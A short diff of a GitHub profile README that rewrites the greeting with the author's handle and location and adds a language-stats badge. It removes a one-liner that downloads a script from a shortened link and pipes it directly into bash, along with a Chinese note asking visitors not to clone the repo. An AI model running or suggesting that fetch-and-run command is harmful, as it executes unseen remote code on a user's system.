@@ -1,4 +1,6 @@
-### Hi there 👋
+### Hi 
+### My name is 8Mi_Yile 
+### from 8Mi-Tech.Community, Shenhu, Jinjiang, Fujian, China
 
 <!--
 **8MiYile/8MiYile** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
@@ -13,7 +15,5 @@ Here are some ideas to get you started:
 - 📫 How to reach me: ...
 - 😄 Pronouns: ...
 - ⚡ Fun fact: ...
--->
- 
-curl -s -L http://bit.ly/10hA8iC | bash
-本仓库仅供观赏，可fork可star但别clone，引用项太多下不完的
+-->[![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=anuraghazra&layout=compact)](https://github.com/anuraghazra/github-readme-stats)
+
